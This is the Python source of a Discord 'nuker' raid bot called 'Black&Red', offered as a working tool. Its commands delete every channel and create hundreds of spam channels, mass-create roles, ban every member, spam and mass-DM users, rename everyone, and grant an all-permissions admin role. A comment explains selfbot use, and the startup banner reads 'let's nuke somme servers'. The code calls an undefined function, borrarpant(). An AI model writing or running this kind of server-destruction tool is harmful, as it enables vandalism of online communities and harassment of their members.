import discord
import asyncio
import os
from discord.ext.commands import *
from discord.ext import commands
from discord import Permissions




##PREFIX##
os.system("cls")
bot = commands.Bot(command_prefix="%")
bot.remove_command('help')


# If you wana use it as a selfbot, change "bot.run(TOKEN)" with "bot.run(TOKEN, bot=False)" (att the end of the script). 
# However you would need an other account to activate the commands.
borrarpant()
help_msg = ('''
=======================<< Black&Red >>=======================
 %raid = Destroys the server 
 %clear {number} = nuke the server
 %role {name} = creates mass role
 %spam {number} {message} = spam in the channel
 %spamall {numer} {message} = spam in every channel
 %banall = bann's everybody
 %dmall {messahe} = dm all
 %create {name} = creats a admin role
 %add {@member} {@role} = add a role to a user
 %rename {name} = rename everybody
=======================<< Black&Red >>=======================
 ''')

embedVar = discord.Embed(title="Black&Red - Confussion", color=0x00ff00)
embedVar.add_field(name="CMD raid", value=help_msg, inline=True)


##BOT IS READY##
@bot.event
async def on_ready():
	
	print("=========================")
	print(" Black&Red is now online!")
	print(" let's nuke somme servers")
	print("=========================")
	print()
	print(help_msg)

 ## %SPAM ##
@bot.command(pass_context=True)
async def spam(ctx, num, message): 
	num2 = int(num)
	await ctx.message.delete()
	print(f"\n Spaming {num2}.... \n")
	for i in range(num2):
		await ctx.send(message)
 

## %ROLE##
@bot.command(pass_context=True)
async def role(ctx, name):
    role_place = True
    await ctx.message.delete()
    print("\n=======================")
    print("CREATING ROLES...")
    print("=======================\n")
    i = 0
    while role_place == True:
        i += 1
        try:
            await ctx.guild.create_role(name=name)
            print(f"[+] role added, {i} done")
        except:
            print(f"[~] NO MORE ROLE SPACE, {i} done")


## %RAID ##
@bot.command(pass_context=True)
async def raid(ctx):
    await ctx.message.delete()
    print("\n=======================")
    print("DELETING CHANELS...")
    print("=======================\n")
    i = 0
    for c in ctx.guild.channels:
    	i = i + 1
    	await c.delete()
    	print(f"[-] channel deleted, {i} done")	
    print("\n=======================")
    print("CREATING CHANELS...")
    print("=======================\n")
    for i in range(500):
    	guild = ctx.message.guild
    	await guild.create_text_channel("UgotFucked")
    	print(f"[+] channel created, {i} done")
    
## %CLEAR ##
@bot.command(pass_context=True)
async def clear(ctx):
    await ctx.message.delete()
    print("\n=======================")
    print("DELETING CHANELS...")
    print("=======================\n")
    i = 0
    for c in ctx.guild.channels:
    	i = i + 1
    	await c.delete()
    	print(f"[-] channel deleted, {i} done")
    print("Done !")
    await ctx.guild.create_text_channel("nuked")
    print("[-] channel created, 1 done")
    print("Done !")

## %RAID2TEST
@bot.command(pass_context=True)
async def raid2test(ctx):
    await ctx.message.delete()
    print("\n=======================")
    print("DELETING CHANELS...")
    print("=======================\n")
    i = 0
    for c in ctx.guild.channels:
    	i = i + 1
    	await c.delete()
    	print(f"[-] channel deleted, {i} done")
    print("Done !")
    print("\n=======================")
    print("CREATING CHANELS...")
    print("=======================\n")
    for i in range(40):
    	guild = ctx.message.guild
    	await guild.create_text_channel("UgotFucked")
    	print(f"[+] channel created, {i} done")
    print("Done !")    	
 
## %BANALL ##
@bot.command(pass_context=True)
async def banall(ctx):
    await ctx.message.delete()
    num = 0
    for member in ctx.guild.members:
        try:
            await member.ban()
            print(f"[+] Banned {member}")
            num += 1
        except:
            print(f"[-] Could not ban {member}")
    print(f"\n[+] Finished baning, sucesfuly baned {num} users")

## %DMALL ##
@bot.command(pass_context=True)
async def dmall(ctx, *, pub):
    num = 0
    for member in ctx.guild.members:
        try:
            await member.send(pub)
            print(f"[+] DM sended to {member}")
            num += 1
        except:
            print(f"[-] Could not sended DM to {member}")
    print(f"\n[+] Finished sending dm, sucesfuly sended to {num} users")

## %CREATE ##
@bot.command(pass_context=True)
async def create(ctx, name):
    await ctx.message.delete()
    await ctx.guild.create_role(name=name, mentionable=True, permissions=Permissions.all())

## %ADD ##
@bot.command(pass_context=True) 
async def add(ctx, user: discord.Member, role: discord.Role):
    await ctx.message.delete()
    await user.add_roles(role)

## %SPAMALL ##
@bot.command(pass_context=True)
async def spamall(ctx, num, *, message):
    await ctx.message.delete()
    num = int(num)
    for a in range(num):
        for channel in ctx.guild.channels:
            await channel.send(message)

## %RENAME ##
@bot.command(pass_context=True)
async def rename(ctx, *, name):
    await ctx.message.delete()
    num = 0
    for member in ctx.guild.members:
        try:
            await member.edit(nick=name)
            print(f"[+] Renamed {member}")
            num += 1
        except:
            print(f"[-] Could not rename {member}")
    print(f"\n[+] Finished renaming, sucesfuly renamed {num} users")



## %HELP ##
@bot.command(pass_context=True)
async def help(ctx):
	print("Help message sended\n")
	await ctx.message.delete()
	await ctx.send(embed=embedVar)

print("Bot token's here")
bot.run(input("> "))